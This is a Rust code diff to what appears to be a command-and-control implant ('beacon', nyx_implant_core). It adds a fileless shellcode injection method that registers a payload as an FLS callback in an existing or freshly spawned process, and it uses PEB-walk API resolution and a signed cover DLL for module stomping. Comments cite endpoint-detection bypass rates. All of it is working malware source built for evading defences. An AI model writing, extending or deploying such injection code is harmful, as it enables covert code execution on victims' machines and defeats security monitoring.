@@ -155,6 +155,25 @@ pub unsafe fn create_sacrificial(spawn_to: &str) -> Result<SacrificialProcess, &
     unsafe { create_sacrificial_spawn(create_proc, &mut cmd, &mut si, &mut pi, 0, true) }
 }
 
+/// Create the sacrificial process `spawn_to` RUNNING (not suspended). The FLS
+/// callback path (method 3) needs this: a CREATE_SUSPENDED process has no
+/// kernel32 mapped yet (the loader runs on the main thread), so a remote
+/// thread starting at a kernel32 export (FlsAlloc / the trigger stub) would
+/// start at an unmapped address. Same Drop-guard contract as
+/// [`create_sacrificial`]: drop terminates a never-`mark_resumed` process and
+/// closes both handles.
+///
+/// # Safety
+/// Uses Win32 CreateProcessW via PEB-walk resolution. Single-threaded beacon
+/// context. The returned struct owns both handles.
+pub unsafe fn create_sacrificial_running(
+    spawn_to: &str,
+) -> Result<SacrificialProcess, &'static str> {
+    let create_proc = unsafe { create_sacrificial_resolve() }?;
+    let (mut cmd, mut si, mut pi) = create_sacrificial_buffers(spawn_to);
+    unsafe { create_sacrificial_spawn(create_proc, &mut cmd, &mut si, &mut pi, 0, false) }
+}
+
 /// `CreateProcessW` (kernel32) — resolved via PEB walk for the sacrificial
 /// process spawn.
 type CreateProcessW = unsafe extern "system" fn(
@@ -559,6 +578,12 @@ unsafe fn stomp_and_resume(
     // the old skeleton passed a cross-process-invalid pointer), fires
     // CreateRemoteThread(LoadLibraryA, <target ptr>), and waits for the thread
     // so LoadLibraryA completes before we parse the freshly-loaded cover.
+    // Cover selection principles: Microsoft-signed, rarely loaded (a clean
+    // .text to stomp), and verified present on the target OS. xpsservices.dll
+    // was confirmed in C:\Windows\System32 on the Win11 24H2 ARM64 test VM
+    // (2026-08-24, 5,219,840 bytes) — a "LoadLibraryA returned NULL" failure
+    // under wine is a wine artifact (the DLL is absent there), not a target
+    // OS absence.
     let cover_dll = b"xpsservices.dll\0"; // legit, signed, rarely used
     let cover_base = unsafe { remote_load_library(proc.handle, cover_dll)? };
     if cover_base == 0 {
@@ -808,7 +833,10 @@ unsafe fn remote_load_library_run_thread(
 /// the untruncated base.
 ///
 /// Returns None if the PEB can't be read or the module isn't found.
-unsafe fn remote_module_base(h: *mut core::ffi::c_void, name: &[u8]) -> Option<usize> {
+///
+/// `pub(crate)` (WP-A): the FLS callback path (fls.rs / method 3) polls this
+/// to wait for kernel32 in a freshly-spawned running sacrificial.
+pub(crate) unsafe fn remote_module_base(h: *mut core::ffi::c_void, name: &[u8]) -> Option<usize> {
     let rpm: ReadProcessMemory =
         core::mem::transmute(export_addr(b"kernel32.dll", b"ReadProcessMemory")?);
     let nqip: NtQueryInformationProcess =
@@ -1350,6 +1378,10 @@ unsafe fn threadless_inject_apply(
 /// - `1` — **Threadless HWBP** (existing `threadless_inject`). Requires a
 ///   sacrificial process (spawn_to) for the main-thread handle.
 /// - `2` — **Module stomp** (existing `module_stomp`). The proven baseline.
+/// - `3` — **FLS callback** ([`crate::fls::fls_callback_inject`]). Registers
+///   the shellcode as an FLS callback in the target via a remote `FlsAlloc`
+///   thread; a stub thread's exit-time rundown fires it. No foreign-thread
+///   suspend/context hijack (AutoBypass Table 11: 60% bypass / 14 alerts).
 ///
 /// **Methods:**
 /// - `0` — Pool Party (section-backed delivery + threadless worker-factory dispatch).
@@ -1358,12 +1390,14 @@ unsafe fn threadless_inject_apply(
 ///   method 2 (module stomp) on any failure with a warning prefix.
 /// - `1` — ThreadlessInject HWBP (sacrificial process).
 /// - `2` — Module Stomp (.text overwrite in a sacrificial process).
+/// - `3` — FLS callback (existing pid or a fresh RUNNING sacrificial).
 ///
-/// `pid`: nonzero targets an EXISTING process. Only method 2 (classic remote
-/// thread) accepts an existing pid; method 0 (Pool Party) requires `pid != 0`
-/// plus the build gate; method 1 (threadless HWBP) requires a sacrificial
-/// process (`pid == 0` + `spawn_to`). `pid == 0` spawns a fresh sacrificial
-/// process via `spawn_to` (default `notepad.exe`).
+/// `pid`: nonzero targets an EXISTING process. Method 2 (classic remote
+/// thread) and method 3 (FLS callback) accept an existing pid; method 0
+/// (Pool Party) requires `pid != 0` plus the build gate; method 1
+/// (threadless HWBP) requires a sacrificial process (`pid == 0` +
+/// `spawn_to`). `pid == 0` spawns a fresh sacrificial process via `spawn_to`
+/// (default `notepad.exe`).
 ///
 /// Returns a `Response::Output` with a status line, or `Response::Err`.
 pub fn do_inject(method: u8, pid: u32, spawn_to: &str, shellcode: &[u8]) -> nyx_protocol::Response {
@@ -1448,6 +1482,12 @@ fn do_inject_pool_party(
             Some(nyx_protocol::Response::Output(msg.into_bytes()))
         }
         Err(e) => {
+            // g6 diagnosis (selftest builds only, 2026-08-22): when the
+            // method-2 fallback ALSO fails, pool_party's own error is lost
+            // from the Response — persist it so VM triage can separate
+            // "pool party broken" from "fallback broken".
+            #[cfg(feature = "selftest")]
+            crate::selftests::write_marker("nyx_g6_pool_party.err", e.as_str());
             // Fall through to module stomp with a warning prefix.
             let mut warn = nyx_implant_core::heap::String::from("WARN: Pool Party failed (");
             warn.push_str(&e);
@@ -1459,6 +1499,15 @@ fn do_inject_pool_party(
                     let mut out = warn.into_bytes();
                     out.append(&mut bytes);
                     nyx_protocol::Response::Output(out)
+                }
+                nyx_protocol::Response::Err(e) => {
+                    // Keep the WARN semantics when the fallback ALSO fails
+                    // (2026-08-24): a bare fallback Err reads as "module
+                    // stomp broken" and hides that Pool Party failed first.
+                    let mut msg = warn;
+                    msg.push_str("fallback also failed: ");
+                    msg.push_str(&e);
+                    nyx_protocol::Response::Err(msg)
                 }
                 other => other,
             };
@@ -1489,17 +1538,21 @@ fn do_inject_dispatch(
     do_inject_sacrificial(effective_method, spawn_to, shellcode, warn_prefix)
 }
 
-/// Existing-process injection (method 2 + pid != 0).
+/// Existing-process injection (method 2 or 3 + pid != 0).
 fn do_inject_existing(
     method: u8,
     pid: u32,
     shellcode: &[u8],
     warn_prefix: nyx_implant_core::heap::String,
 ) -> nyx_protocol::Response {
+    if method == 3 {
+        return do_inject_existing_fls(pid, shellcode, warn_prefix);
+    }
     if method != 2 {
         return nyx_protocol::Response::Err(nyx_implant_core::heap::String::from(
             "inject: method 1 (threadless HWBP) targets a sacrificial process; \
-             existing-pid injection is method 2 (classic remote thread) only",
+             existing-pid injection is method 2 (classic remote thread) or \
+             method 3 (FLS callback)",
         ));
     }
     match unsafe { inject_existing(pid, shellcode) } {
@@ -1531,7 +1584,8 @@ fn do_inject_existing(
 }
 
 /// Sacrificial-process path (pid == 0): method 1 = threadless HWBP on a
-/// fresh sacrificial; method 2 = module stomp.
+/// fresh sacrificial; method 2 = module stomp; method 3 = FLS callback into a
+/// fresh RUNNING sacrificial.
 fn do_inject_sacrificial(
     method: u8,
     spawn_to: &str,
@@ -1540,6 +1594,7 @@ fn do_inject_sacrificial(
 ) -> nyx_protocol::Response {
     match method {
         1 => do_inject_sacrificial_threadless(spawn_to, shellcode),
+        3 => do_inject_sacrificial_fls(spawn_to, shellcode, warn_prefix),
         2 => {
             if !modulestomp_enabled() {
                 // Disarmed: creating a sacrificial just to terminate it is
@@ -1620,6 +1675,148 @@ fn do_inject_sacrificial_threadless(spawn_to: &str, shellcode: &[u8]) -> nyx_pro
         }
         Err(e) => nyx_protocol::Response::Err(nyx_implant_core::heap::String::from(e)),
     }
+}
+
+/// Method 3 on the sacrificial path: spawn the sacrificial RUNNING (a
+/// suspended one has no kernel32 mapped yet — a remote FlsAlloc thread would
+/// start at an unmapped address), wait for kernel32 to load, then FLS-inject
+/// into it.
+fn do_inject_sacrificial_fls(
+    spawn_to: &str,
+    shellcode: &[u8],
+    warn_prefix: nyx_implant_core::heap::String,
+) -> nyx_protocol::Response {
+    if !crate::fls::fls_inject_enabled() {
+        // Disarmed: creating a sacrificial just to terminate it is wasteful
+        // and noisy — fail fast (the method-2 gate-check precedent).
+        let mut msg = warn_prefix;
+        msg.push_str("fls callback inject disabled (gate off)");
+        return nyx_protocol::Response::Err(nyx_implant_core::heap::String::from(msg));
+    }
+    let target = if spawn_to.is_empty() {
+        "notepad.exe"
+    } else {
+        spawn_to
+    };
+    match unsafe { create_sacrificial_running(target) } {
+        Ok(mut proc) => {
+            let res = match unsafe { wait_remote_kernel32(proc.handle) } {
+                Ok(()) => {
+                    match unsafe { crate::fls::fls_callback_inject(proc.handle, shellcode) } {
+                        Ok(()) => {
+                            // The payload is executing in the target (in a
+                            // fresh remote thread, not the main thread) — the
+                            // Drop guard must NOT terminate the process (it
+                            // only closes the handles on drop).
+                            proc.mark_resumed();
+                            let mut msg = warn_prefix;
+                            msg.push_str("fls callback inject ok (sacrificial pid=");
+                            let mut buf = [0u8; 10];
+                            let mut n = proc.pid;
+                            let mut i = buf.len();
+                            if n == 0 {
+                                buf[0] = b'0';
+                                i = 1;
+                            } else {
+                                while n > 0 {
+                                    i -= 1;
+                                    buf[i] = b'0' + (n % 10) as u8;
+                                    n /= 10;
+                                }
+                            }
+                            for &b in &buf[i..] {
+                                msg.push(b as char);
+                            }
+                            msg.push(')');
+                            nyx_protocol::Response::Output(msg.into_bytes())
+                        }
+                        Err(e) => nyx_protocol::Response::Err(nyx_implant_core::heap::String::from(e)),
+                    }
+                }
+                Err(e) => nyx_protocol::Response::Err(nyx_implant_core::heap::String::from(e)),
+            };
+            // The Drop guard on `proc` owns cleanup: on success it closes the
+            // handles fire-and-forget; on failure it terminates the running
+            // sacrificial + closes both handles — no path leaks.
+            res
+        }
+        Err(e) => nyx_protocol::Response::Err(nyx_implant_core::heap::String::from(e)),
+    }
+}
+
+/// Poll the target's loader list until kernel32 is mapped — i.e. process init
+/// has progressed far enough that a remote thread starting at a kernel32
+/// export (FlsAlloc / the trigger stub's FlsSetValue) runs on real code.
+/// Bounded: 50 × 100 ms.
+pub(crate) unsafe fn wait_remote_kernel32(h: *mut core::ffi::c_void) -> Result<(), &'static str> {
+    for _ in 0..50 {
+        if unsafe { remote_module_base(h, b"kernel32.dll") }.is_some() {
+            return Ok(());
+        }
+        unsafe { sleep_ms(100) };
+    }
+    Err("target: kernel32 not mapped (loader never ran)")
+}
+
+/// Existing-process FLS callback injection (method 3 + pid != 0). Opens the
+/// target with the minimal rights the version-agnostic path needs — no
+/// PROCESS_VM_READ: unlike module stomp / Pool Party, fls_callback_inject
+/// never reads remote memory (the target's own ntdll does the FLS
+/// bookkeeping). PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION |
+/// PROCESS_VM_WRITE | PROCESS_QUERY_LIMITED_INFORMATION = 0x102A (the
+/// QUERY_LIMITED bit lets IsWow64Process2 classify the target architecture —
+/// fls.rs's Prism refusal is scoped to cross-arch targets, 2026-08-24).
+fn do_inject_existing_fls(
+    pid: u32,
+    shellcode: &[u8],
+    warn_prefix: nyx_implant_core::heap::String,
+) -> nyx_protocol::Response {
+    match unsafe { inject_existing_fls(pid, shellcode) } {
+        Ok(()) => {
+            let mut msg = warn_prefix;
+            msg.push_str("fls callback inject ok (pid=");
+            let mut buf = [0u8; 10];
+            let mut n = pid;
+            let mut i = buf.len();
+            if n == 0 {
+                buf[0] = b'0';
+                i = 1;
+            } else {
+                while n > 0 {
+                    i -= 1;
+                    buf[i] = b'0' + (n % 10) as u8;
+                    n /= 10;
+                }
+            }
+            for &b in &buf[i..] {
+                msg.push(b as char);
+            }
+            msg.push(')');
+            nyx_protocol::Response::Output(msg.into_bytes())
+        }
+        Err(e) => nyx_protocol::Response::Err(nyx_implant_core::heap::String::from(e)),
+    }
+}
+
+/// Open `pid` and hand the handle to [`crate::fls::fls_callback_inject`]. The
+/// handle is closed on every path (the inject does not retain it).
+unsafe fn inject_existing_fls(pid: u32, shellcode: &[u8]) -> Result<(), &'static str> {
+    let op: OpenProcessFn = match export_addr(b"kernel32.dll", b"OpenProcess") {
+        Some(a) => unsafe { core::mem::transmute(a) },
+        None => return Err("OpenProcess unresolved"),
+    };
+    // PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE |
+    // PROCESS_QUERY_LIMITED_INFORMATION (see do_inject_existing_fls docs).
+    let h_proc = unsafe { op(0x102A, 0, pid) };
+    if h_proc.is_null() || h_proc as usize == usize::MAX {
+        return Err("OpenProcess failed (pid/access)");
+    }
+    let res = unsafe { crate::fls::fls_callback_inject(h_proc, shellcode) };
+    if let Some(addr) = export_addr(b"kernel32.dll", b"CloseHandle") {
+        let close: CloseHandleFn = unsafe { core::mem::transmute(addr) };
+        let _ = unsafe { close(h_proc) };
+    }
+    res
 }
 
 /// Inject shellcode into an EXISTING process (pid != 0).
